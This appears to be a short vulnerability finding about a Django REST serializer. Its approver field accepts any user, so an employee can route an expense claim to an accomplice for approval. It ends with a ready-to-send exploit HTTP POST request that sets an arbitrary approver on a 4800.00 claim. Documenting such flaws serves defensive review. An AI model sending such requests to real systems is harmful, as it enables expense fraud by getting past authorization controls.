diagnosis: ExpenseClaimSerializer uses a global User.objects.all() queryset on the approver HyperlinkedRelatedField. When submitting an expense claim, an employee can pass a hyperlink URL designating any system user as approver, bypassing authorized departmental management hierarchies and selecting an accomplice or non-manager outside their department.
exploit_request:
POST /api/expenses/claims/ HTTP/1.1
Host: erp.company.net
Authorization: Bearer <employee_token>
Content-Type: application/json

{"expense_title": "Executive Travel", "amount_requested": 4800.00, "approver": "https://erp.company.net/api/users/912/"}
